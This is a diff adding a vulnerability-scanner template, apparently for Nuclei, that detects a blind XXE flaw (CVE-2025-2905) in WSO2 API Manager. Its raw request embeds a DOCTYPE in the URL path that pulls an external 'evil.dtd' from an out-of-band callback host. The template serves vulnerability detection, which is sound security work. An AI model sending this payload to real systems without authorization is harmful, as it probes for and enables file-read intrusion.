@@ -1,0 +1,25 @@
+id: wso2-xxe
+
+info:
+  name: Wso2 404 to arbitrary file read
+  author: Omkar7505
+  severity: high
+  description: CVE-2025-2905 is a blind XXE vulnerability in WSO2 API Manager and other WSO2 products dependent on WSO2-Synapse.
+  reference:
+    - https://crnkovic.dev/wso2-404-to-arbitrary-file-read/
+
+
+http:
+  - raw:
+      - |
+        GET /http://whatever/<!DOCTYPE  blah  SYSTEM  "http://{{interactsh-url}}/evil.dtd"> HTTP/1.1
+        Host: {{Hostname}}
+
+    unsafe: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+
